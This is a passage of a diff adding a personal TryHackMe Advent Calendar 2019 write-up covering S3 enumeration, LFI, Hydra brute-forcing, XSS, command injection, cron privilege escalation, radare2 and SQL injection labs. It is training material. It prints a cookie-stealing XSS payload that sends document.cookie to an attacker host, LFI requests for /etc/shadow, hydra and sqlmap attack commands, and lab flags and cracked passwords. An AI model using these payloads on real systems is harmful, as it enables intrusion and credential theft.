+      <li>Domain name of product names:
+        <ul>
+          <li>If a product or domain is called “servicename” then the s3 bucket may also be called “servicename”</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Once we have an s3 bucket, we can check if it’s publicly accessible by browsing to the URL. The format of the URL is:
+<em>bucketname.s3.amazonaws.com</em></p>
+  </li>
+  <li>
+    <p>Even though S3 buckets are global, we can still access them on their region:
+bucketname.region-name.amazonaws.com</p>
+  </li>
+  <li>
+    <p>If you’ve found objects on an s3 bucket, you would want to download them to view their contents. You do this using the AWS CLI. To use the AWS CLI, you need to create an account.</p>
+  </li>
+  <li>
+    <p>Once you have created an AWS account, you can check the contents of the bucket using the command
+<code class="language-plaintext highlighter-rouge">aws s3 ls s3://bucket-name</code></p>
+  </li>
+  <li>
+    <p>To download the files, you can use the command:
+<code class="language-plaintext highlighter-rouge">aws s3 cp s3://bucket-name/file-name local-location</code></p>
+  </li>
+  <li>Alternatively, you can also use the following method to access a file:
+<code class="language-plaintext highlighter-rouge">bucketname.region-name.amazonaws.com/file-name</code></li>
+</ul>
+
+<ol>
+  <li>What is the name of the file you found?</li>
+</ol>
+
+<ul>
+  <li>Accessed the following link and got some info about the bucket:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/cloudaws1.png" alt="" /></p>
+
+<p>A: employee_names.txt</p>
+
+<ol>
+  <li>What is in the file?</li>
+</ol>
+
+<ul>
+  <li>Then I added /file_name to get the contents of the file</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/aws2.png" alt="" /></p>
+
+<p>A: mcchef</p>
+
+<h2 id="day15-lfi">[Day15] LFI</h2>
+
+<ul>
+  <li><a href="https://blog.tryhackme.com/lfi/">Help Doc</a></li>
+</ul>
+
+<p>-For example if a web application has the following request:</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://example.com/?include_file=file1.php</code></p>
+
+<ul>
+  <li>
+    <p>This would take the contents from file1.php and display it on the page.</p>
+  </li>
+  <li>
+    <p>If an <em>application doesn’t whitelist</em> which files can be included, a user would be able to request the file <em><strong>/etc/shadow</strong>, showing all users hashed passwords on the system</em> running the web application.</p>
+  </li>
+  <li>
+    <p>When the web application includes a file, it will read it with the permissions of the user running the web server.</p>
+
+    <ul>
+      <li>For example, if the user joe runs the web server, it will read the file with joe’s permissions, if its running as root, it will have the root users permissions.</li>
+    </ul>
+  </li>
+  <li>
+    <p>With local file inclusion, you can try and view the following files to assist you in taking over a machine.</p>
+
+    <ul>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">/etc/shadow</code> - View hashes passwords of all users on the system</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">server.js</code> or <code class="language-plaintext highlighter-rouge">index.js</code></p>
+      </li>
+    </ul>
+
+  	- If the application was written in NodeJS, these are common file names that contain the main code to an application - potential API credentials might be exposed upon reading the file.
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">/etc/hosts</code></li>
+    </ul>
+
+   	- Perhaps the web server machine is communicating with other devices on the network.
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">/uploads/evil.php</code></li>
+    </ul>
+
+  	- If you manage to upload your own web shell onto the web server at some point, you can have it executed by including the file.
+  </li>
+  <li>
+    <p>Take the following request:</p>
+  </li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">https://example.com/notes/?include=/etc/shadow</code></p>
+
+<ul>
+  <li>
+    <p>The server will think its going to <code class="language-plaintext highlighter-rouge">/notes/include/etc/shadow</code>.</p>
+  </li>
+  <li>
+    <p>You can’t include a slash in the URL as the web server will think its making a request to a different directory.</p>
+  </li>
+  <li>
+    <p>The solution is to use <strong>URL encoding</strong>.</p>
+
+    <ul>
+      <li>
+        <p>URL encoding replaces unsafe ASCII characters with ‘%’ followed by two hexadecimal digits.</p>
+      </li>
+      <li>
+        <p>A slash (/) can be URL encoded as %2F. This means we can change the request we previously had to:</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">https://example.com/notes/?include=%2Fetc%2Fshadow</code></p>
+
+<ul>
+  <li>
+    <p>This new request will be made to /notes/ and then convert the %2F to a slash!</p>
+
+    <ul>
+      <li>Removing any ambiguity in where the request is made and the file we’re including.</li>
+    </ul>
+  </li>
+</ul>
+
+<ol>
+  <li>What is Charlie going to book a holiday to?</li>
+</ol>
+
+<ul>
+  <li>Just read the webpage</li>
+</ul>
+
+<p>A: Hawaii</p>
+
+<ol>
+  <li>Read /etc/shadow and crack Charlies password.</li>
+</ol>
+
+<ul>
+  <li>If we view the source we can see a function we can potentially exploit using LFI:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/viewsource.png" alt="" /></p>
+
+<ul>
+  <li>I get the /etc/shadow file using LFI:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/gethascharlie.png" alt="" /></p>
+
+<ul>
+  <li>Use hashcat with rockyou.txt to crack the hash:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/hashcatcharlie.png" alt="" /></p>
+
+<p>A: password1</p>
+
+<ol>
+  <li>What is flag1.txt?</li>
+</ol>
+
+<ul>
+  <li>URl encoded /home/charlie/flag1.txt and got the flag:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/flag11111.png" alt="" /></p>
+
+<p>A: THM{4ea2adf842713ad3ce0c1f05ef12256d}</p>
+
+<h2 id="day16-file-confusion">[Day16] File Confusion</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/13eYEcqpyp3fIAnaDR8PHz6qibBJJwf2Vp5M77KkEKtw/edit#">Help Doc</a></li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">zipfile</span><span class="p">,</span> <span class="n">exiftool</span>
+
+<span class="n">listOfFiles</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"/home/george/Documents/TryHackMe/AdventCalendar2019/zipped"</span><span class="p">)</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="s">"/home/george/Documents/TryHackMe/AdventCalendar2019/zipped"</span>
+
+<span class="n">alreadyZipped</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="n">toBeZipped</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># Zipping nested files in the same directory and removing the .zip files afterwards
+</span>
+<span class="k">while</span> <span class="n">toBeZipped</span><span class="p">:</span>
+	<span class="n">listOfFiles</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"/home/george/Documents/TryHackMe/AdventCalendar2019/zipped"</span><span class="p">)</span>
+	<span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">listOfFiles</span><span class="p">:</span>
+		<span class="n">toBeZipped</span> <span class="o">=</span> <span class="bp">False</span>
+		<span class="k">if</span> <span class="nb">file</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">alreadyZipped</span> <span class="ow">and</span> <span class="nb">file</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span> <span class="o">==</span> <span class="s">".zip"</span><span class="p">:</span>
+			<span class="n">toBeZipped</span> <span class="o">=</span> <span class="bp">True</span>
+			<span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="nb">file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zip_ref</span><span class="p">:</span>
+				<span class="n">zip_ref</span><span class="p">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+				<span class="n">alreadyZipped</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
+
+
+
+<span class="n">listOfFiles</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"/home/george/Documents/TryHackMe/AdventCalendar2019/zipped"</span><span class="p">)</span>
+<span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">listOfFiles</span><span class="p">:</span>
+	<span class="k">if</span> <span class="nb">file</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span> <span class="o">==</span> <span class="s">".zip"</span> <span class="p">:</span>
+		<span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="nb">file</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Extracted files: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"/home/george/Documents/TryHackMe/AdventCalendar2019/zipped"</span><span class="p">))</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1"># Determine the number of files that have XML version equal to 1.1 using exiftool
+</span>
+<span class="n">files</span> <span class="o">=</span> <span class="p">[</span><span class="nb">file</span> <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">listOfFiles</span><span class="p">]</span>
+
+<span class="k">with</span> <span class="n">exiftool</span><span class="p">.</span><span class="n">ExifTool</span><span class="p">()</span> <span class="k">as</span> <span class="n">et</span><span class="p">:</span> 
+	<span class="n">metadata</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="n">get_metadata_batch</span><span class="p">(</span><span class="n">files</span><span class="p">)</span>
+
+<span class="n">metacounter</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">metadata</span><span class="p">:</span>
+	<span class="k">if</span> <span class="s">'XMP:Version'</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
+		<span class="n">metacounter</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="s">'SourceFile'</span><span class="p">]</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="s">'XMP:Version'</span><span class="p">]))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'There are </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">metacounter</span><span class="p">)</span><span class="si">}</span><span class="s"> files with version 1.1, namely: '</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">metacounter</span><span class="p">:</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+
+<span class="c1"># Searching for the password in the files
+</span>
+<span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">listOfFiles</span><span class="p">:</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span><span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">reader</span><span class="p">:</span>
+			<span class="n">lines</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
+			<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
+				<span class="k">if</span> <span class="s">'password'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Password found in </span><span class="si">{</span><span class="nb">file</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">line</span><span class="p">[</span><span class="o">-</span><span class="mi">15</span><span class="si">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span> 
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">continue</span>
+</code></pre></div></div>
+
+<ol>
+  <li>How many files did you extract(excluding all the .zip files)</li>
+</ol>
+
+<p>A: 50</p>
+
+<ol>
+  <li>How many files contain Version: 1.1 in their metadata?</li>
+</ol>
+
+<p>A: 3</p>
+
+<ol>
+  <li>Which file contains the password?</li>
+</ol>
+
+<p>A: dL6w.txt</p>
+
+<h2 id="day17-hydra-ha-ha-haa">[Day17] Hydra-ha-ha-haa</h2>
+
+<ul>
+  <li><a href="https://blog.tryhackme.com/hydra/">Help Doc</a></li>
+</ul>
+
+<ol>
+  <li>Use Hydra to bruteforce molly’s web password. What is flag 1? (The flag is mistyped, its THM, not TMH)</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Performed an Nmap scan and saw there are two ports open: 80 and 22.</p>
+  </li>
+  <li>
+    <p>Used the command <code class="language-plaintext highlighter-rouge">hydra -l molly -P rockyou.txt 10.10.64.64 http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect" -V</code> to get the password for molly:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/hidra1.png" alt="" /></p>
+
+<p>A:  THM{2673a7dd116de68e85c48ec0b1f2612e}</p>
+
+<ol>
+  <li>Use Hydra to bruteforce molly’s SSH password. What is flag 2?</li>
+</ol>
+
+<ul>
+  <li>Used the following command: <code class="language-plaintext highlighter-rouge">hydra -l molly -P rockyou.txt 10.10.64.64 ssh -V</code></li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/hydra2.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Did not use <code class="language-plaintext highlighter-rouge">-t 4</code> because it finds the pw faster in this case :)</p>
+  </li>
+  <li>
+    <p>Logged in using ssh and cat the flag.</p>
+  </li>
+</ul>
+
+<p>A: THM{c8eeb0468febbadea859baeb33b2541b}</p>
+
+<h2 id="day18-elf-js">[Day18] ELF JS</h2>
+
+<ul>
+  <li>
+    <p><a href="https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#">Help Doc</a></p>
+  </li>
+  <li>
+    <p>A lot of different websites require user input.</p>
+
+    <ul>
+      <li>
+        <p>This includes everything from adding posts to a form to adding an amount in a bank transfer.</p>
+      </li>
+      <li>
+        <p>We’ve seen that websites require Javascript to work properly.</p>
+      </li>
+      <li>
+        <p>A malicious user could easily inject javascript into a page and perform malicious actions.</p>
+
+        <ul>
+          <li>This type of an attack is called <em>(XSS(Cross Site Scripting))</em>.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="reflected-xss">Reflected XSS</h3>
+
+<ul>
+  <li>
+    <p>Reflected XSS is when arbitrary javascript is reflected off a server(and is not permanent).</p>
+  </li>
+  <li>
+    <p>This is done in scenarios like error pages, links where the payload is passed as a request and also included in the response.</p>
+
+    <ul>
+      <li>
+        <p>The most common case for this is when an attacker sends a URL containing a malicious payload to the victim.</p>
+
+        <ul>
+          <li>The victim would click this URL and the payload would be executed.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="stored-xss">Stored XSS</h3>
+
+<ul>
+  <li>
+    <p>Stored XSS is when arbitrary javascript is stored on a database and this javascript is retrieved and displayed to a user.</p>
+  </li>
+  <li>
+    <p>This tends to be more dangerous than reflected XSS as the payload is automatically passed(and even executed) to a user.</p>
+  </li>
+  <li>
+    <p>Javascript is very powerful and an attacker can do many things with Javascript:</p>
+
+    <ul>
+      <li>
+        <p><em>Steal session cookies</em>:</p>
+
+        <ul>
+          <li>This would allow an attacker to access a user’s account</li>
+        </ul>
+      </li>
+      <li>
+        <p><em>Write Keyloggers</em>:</p>
+
+        <ul>
+          <li>This would allow an attacker to extract sensitive information from a user such as credit card details</li>
+        </ul>
+      </li>
+      <li>
+        <p><em>General Spam</em>:</p>
+
+        <ul>
+          <li>An attacker could just be a nuisance and ruin a user’s experience with a website by manipulating various elements on the page and more</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<ol>
+  <li>What is the admin’s authid cookie value?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>I used the following javascript code to create a post: <code class="language-plaintext highlighter-rouge">&lt;script&gt;window.location = 'http://10.8.12.151:4545/?=' + document.cookie&lt;/script&gt;</code></p>
+  </li>
+  <li>
+    <p>Then I opened up a netcat on port 4545 and waited quite a bit for the admin to log in:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/netcaaat.png" alt="" /></p>
+
+<p>A: 2564799a4e6689972f6d9e1c7b406f87065cbf65</p>
+
+<h2 id="day19-commands">[Day19] Commands</h2>
+
+<ul>
+  <li>
+    <p><a href="https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit?usp=sharing">Help Doc</a></p>
+  </li>
+  <li>
+    <p>Command Injection attacks are considered extremely dangerous; they essentially allow an attacker to execute commands on a system.</p>
+  </li>
+  <li>
+    <p>The most common thing to do when discovering you have a command injection attack is getting a reverse shell.</p>
+
+    <ul>
+      <li>Reverse shells can be thought of as backdoors. When an attacker creates this reverse shell, the target server acts as a client, executes command sent by an attacker, and sometimes sends the output of the command back to the attacker.</li>
+      <li>
+        <p>An attacker would usually use system resources on the target to create a shell:</p>
+
+        <ul>
+          <li>Netcat</li>
+          <li>Python</li>
+          <li>Bash</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet - this is a good resource to use different programs to create a reverse shell.</p>
+  </li>
+  <li>
+    <p>an application can interact with the underlying system in different ways:</p>
+
+    <ul>
+      <li>
+        <p>The application may just ask users to input commands</p>
+
+        <ul>
+          <li>This is the best case scenario and tends to be very rare.</li>
+          <li>All you would have to do is just enter a command and the web application will execute it on the underlying system</li>
+        </ul>
+      </li>
+      <li>
+        <p>The application filters allowed commands:</p>
+
+        <ul>
+          <li>
+            <p>This tends to be more common than the previous issue.</p>
+          </li>
+          <li>
+            <p>For example, an application may only accept the ping command.</p>
+          </li>
+          <li>
+            <p>You would have to enumerate what commands are allowed and try to use the allowed command to exfiltrate data</p>
+          </li>
+        </ul>
+      </li>
+      <li>
+        <p>The application takes input to a command:</p>
+
+        <ul>
+          <li>
+            <p>This is even more common.</p>
+          </li>
+          <li>
+            <p>An example is that an application takes input to the ping command(an IP address) and passes this input to the ping command on the backend.</p>
+          </li>
+        </ul>
+      </li>
+      <li>
+        <p>If the input isn’t encoded or filtered, you can actually uses this to run other commands.</p>
+
+        <ul>
+          <li>
+            <p>The &amp;&amp; operator is used with more than one command e.g. ls &amp;&amp; pwd. The second command only executes if the first command and the second command is successful. You can pass an input containing &amp;&amp; other-command and the backend would successfully execute it if both commands ran successfully.</p>
+          </li>
+          <li>
+            <table>
+              <tbody>
+                <tr>
+                  <td>The</td>
+                  <td>command is used to pass output from one command to another and can also be used to execute commands on the server.</td>
+                </tr>
+              </tbody>
+            </table>
+          </li>
+          <li>The ; character also works well. In most shells, it signifies that a command is complete. You can use this to chain commands so if the input is command. Then you can provide command;other-command.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p><em>Where Would You Find Command Injection?</em></p>
+
+    <ul>
+      <li>
+        <p><em>Text boxes that take in input</em></p>
+      </li>
+      <li>
+        <p><em>Hidden URLs that take input</em></p>
+
+        <ul>
+          <li>
+            <p>E.g. /execute/command-name</p>
+          </li>
+          <li>
+            <p>Or through queries e.g. /location?parameter=command</p>
+          </li>
+          <li>
+            <p>When using URLs, remember to URL encode the characters that aren’t accepted</p>
+          </li>
+        </ul>
+      </li>
+      <li>
+        <p><em>Hidden ports</em>:</p>
+
+        <ul>
+          <li>Some frameworks open debug ports that take in arbitrary commands</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<ol>
+  <li>What are the contents of the user.txt file?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Tried some commands on <code class="language-plaintext highlighter-rouge">/api/cmd/command</code> to gain some knowledge about the system</p>
+  </li>
+  <li>
+    <p>I was root and I was placed in a directory with a long path.</p>
+  </li>
+  <li>
+    <p>So i used this command <code class="language-plaintext highlighter-rouge">find / -name user.txt -exec cat {} \;</code> to cat user.txt, which i url encoded: <code class="language-plaintext highlighter-rouge">find%20%2F%20-name%20user.txt%20-exec%20cat%20%7B%7D%20%5C%3B</code></p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/comandinjection.png" alt="" /></p>
+
+<p>A: 5W7WkjxBWwhe3RNsWJ3Q</p>
+
+<h2 id="day20-cronjob-privilege-escalation">[Day20] Cronjob Privilege Escalation</h2>
+
+<ol>
+  <li>What port is SSH running on?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2019/enum20.png" alt="" /></p>
+
+<p>A: 4567</p>
+
+<ol>
+  <li>Crack sam’s password and read flag1.txt</li>
+</ol>
+
+<ul>
+  <li>I used Hydra to crack sam’s pw and then using ssh I logged in as sam</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/findingsamspass.png" alt="" /></p>
+
+<p>A: THM{dec4389bc09669650f3479334532aeab}</p>
+
+<ol>
+  <li>Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?</li>
+</ol>
+
+<ul>
+  <li>Added this line to the file in /home directory that is a cronjob:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/addedline.png" alt="" /></p>
+
+<ul>
+  <li>Got a root shell:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/rootsheeel.png" alt="" /></p>
+
+<p>A: THM{b27d33705f97ba2e1f444ec2da5f5f61}</p>
+
+<h2 id="day21-reverse-elf-ineering">[Day21] Reverse Elf-ineering</h2>
+
+<ul>
+  <li>
+    <p><a href="https://drive.google.com/file/d/1maTcdquyqnZCIcJO7jLtt4cNHuRQuK4x/view?usp=sharing">Help Doc</a></p>
+  </li>
+  <li>
+    <p>open it using radare2: <code class="language-plaintext highlighter-rouge">r2 -d ./file</code> -&gt; debugging mode</p>
+  </li>
+  <li>
+    <p>analyze the program: <code class="language-plaintext highlighter-rouge">aa</code></p>
+  </li>
+  <li>
+    <p>general help: <code class="language-plaintext highlighter-rouge">?</code></p>
+  </li>
+  <li>
+    <p>help on specific info: <code class="language-plaintext highlighter-rouge">a?</code></p>
+  </li>
+  <li>
+    <p>get a list of functions: <code class="language-plaintext highlighter-rouge">afl</code></p>
+  </li>
+  <li>
+    <p>examine: <code class="language-plaintext highlighter-rouge">pdf @main</code> -&gt; print disassembly function</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/assemblyy.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>breakpoint: <code class="language-plaintext highlighter-rouge">db address</code></p>
+  </li>
+  <li>
+    <p>run the program: <code class="language-plaintext highlighter-rouge">dc</code></p>
+  </li>
+  <li>
+    <p>view content of local variable: <code class="language-plaintext highlighter-rouge">px @memory address</code></p>
+  </li>
+  <li>
+    <p>go to the next instruction: <code class="language-plaintext highlighter-rouge">ds</code></p>
+  </li>
+  <li>
+    <p>value of registers: <code class="language-plaintext highlighter-rouge">dr</code></p>
+  </li>
+  <li>
+    <p>The general formula for working through something like this is:
+  ● set appropriate break points
+  ● use ds to move through instructions and check the values of register and memory
+  ● if you make a mistake, you can always reload the program using the ood command</p>
+  </li>
+</ul>
+
+<ol>
+  <li>What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>ran <code class="language-plaintext highlighter-rouge">r2 -d ./challenge1</code></p>
+  </li>
+  <li>
+    <p>once inside: <code class="language-plaintext highlighter-rouge">aa</code> and <code class="language-plaintext highlighter-rouge">afl | grep main</code> and <code class="language-plaintext highlighter-rouge">pdf @ main</code></p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/aflmain.png" alt="" /></p>
+
+<p><img src="/tryhackme/AdventCalendar2019/Screenshot%20at%202022-02-22%2007-42-03.png" alt="" /></p>
+
+<p>A: 1</p>
+
+<ol>
+  <li>What is the value of eax when the imull instruction is called?</li>
+</ol>
+
+<ul>
+  <li>Made a breakpoint before imul</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/breakpoint.png" alt="" /></p>
+
+<ul>
+  <li>Then by using <code class="language-plaintext highlighter-rouge">ds</code> and <code class="language-plaintext highlighter-rouge">dr</code> we can figure out the value of eax</li>
+</ul>
+
+<p>A: 6</p>
+
+<ol>
+  <li>What is the value of local_4h before eax is set to 0?</li>
+</ol>
+
+<p>A: 6</p>
+
+<h2 id="day22-if-santa-then-christmas">[Day22] If Santa, Then Christmas</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/1cIHd_YQ_PHhkUPMrEDWAIfQFb9M9ge3OFr22HHaHQOU/edit?usp=sharing">Help Doc</a></li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/Screenshot%20at%202022-02-22%2007-55-25.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>by analysing the main function, we can see that it compares 2 with 8 anc check if 8 is less or equal to 2.</p>
+  </li>
+  <li>
+    <p>As this is false, it ignores the first jump and adds 1 to local_8h variable, while the local_4h remains unchanged</p>
+  </li>
+</ul>
+
+<ol>
+  <li>what is the value of local_8h before the end of the main function?</li>
+</ol>
+
+<p>A: 9</p>
+
+<ol>
+  <li>what is the value of local_4h before the end of the main function?</li>
+</ol>
+
+<p>A: 2</p>
+
+<h2 id="day23-lapland-sql-injection">[Day23] LapLANd (SQL injection)</h2>
+
+<ul>
+  <li>
+    <p><a href="https://docs.google.com/document/d/15XH_T1o6FLvnV19_JnXdlG2A8lj2QtepXMtVQ32QXk0/edit?usp=sharing">Help Doc</a></p>
+  </li>
+  <li>
+    <p>Made an account and ran a very blind sqlmap that highlighted the answer to the first question and also the name of the database: <em>social</em></p>
+  </li>
+</ul>
+
+<ol>
+  <li>Which field is SQL injectable? Use the input name used in the HTML code.</li>
+</ol>
+
+<p>A: log_email</p>
+
+<ol>
+  <li>What is Santa Claus’ email address?</li>
+</ol>
+
+<ul>
+  <li>Used burp suite to intercept the POST Request:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/burpppp.png" alt="" /></p>
+
+<ul>
+  <li>Then used sqlmap again to try to find the tables in the database <em>social</em>:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/firstsqlmap.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Also I used more threads to speed it up a little</p>
+  </li>
+  <li>
+    <p>Used <code class="language-plaintext highlighter-rouge">sqlmap -r burp.txt -D social -U users --tables --threads=5</code> to get the columns of table users:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/Screenshot%20at%202022-02-22%2017-41-21.png" alt="" /></p>
+
+<ul>
+  <li>Using this command <code class="language-plaintext highlighter-rouge">sqlmap -r burp.txt -D social -T users -C email,username,password --dump --threads=5</code> I got the data I need to answer question 2 and 3 (after cracking it)</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/Screenshot%20at%202022-02-22%2017-42-49.png" alt="" /></p>
+
+<p>A: bigman@shefesh.com</p>
+
+<ol>
+  <li>What is Santa Claus’ plaintext password?</li>
+</ol>
+
+<ul>
+  <li>We are going to use hashcat to crack the hash of santa’s pw: f1267830a78c0b59acc06b05694b2e28</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/hashcataaaa.png" alt="" /></p>
+
+<p>A: saltnpepper</p>
+
+<ol>
+  <li>Santa has a secret! Which station is he meeting Mrs Mistletoe in?</li>
+</ol>
+
+<ul>
+  <li>Logged in as Santa and checked its private messages:</li>
+</ul>
+
+<p>A: Waterloo</p>
+
+<ol>
+  <li>Once you’re logged in to LapLANd, there’s a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Tried to upload some reverse shells as a post on santa’s account.</p>
+  </li>
+  <li>
+    <p>Tried every php extension I could think of and also .pl and .html. The only one that did not show an image picture in the post (thus, one that worked) was .phtml:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/revsheeel.png" alt="" /></p>
+
+<p>A: THM{SHELLS_IN_MY_EGGNOG}</p>
+
+<h2 id="day24-elf-stalk">[Day24] Elf Stalk</h2>
+
+<ul>
+  <li>Nmap scan:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/nmap.png" alt="" /></p>
+
+<ul>
+  <li>Looked on port 8000 and I found a log file. Here, i found a port and decided to check it out, as it did not show in my nmap search</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/kibanalog.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>then it opened this website which gives me access to some of the database (messages).</p>
+  </li>
+  <li>
+    <p>searching through the messages, I found some creds:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/messages.png" alt="" /></p>
+<ul>
+  <li>creds: l33tperson:9Qs58Ol3AXkMWLxiEyUyyf</li>
+</ul>
+
+<ol>
+  <li>Find the password in the database</li>
+</ol>
+
+<ul>
+  <li>The password we found is the answer here</li>
+</ul>
+
+<p>A: 9Qs58Ol3AXkMWLxiEyUyyf</p>
+
+<ol>
+  <li>Read the contents of the /root.txt file</li>
+</ol>
+
+<ul>
+  <li>The nmap port scan revealed some additional opened ports:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/nmapportscans.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>As I had the version 6.4.2 and the name, I searched for some exploits. Used searchsploit and tried a CSV injection that did now work</p>
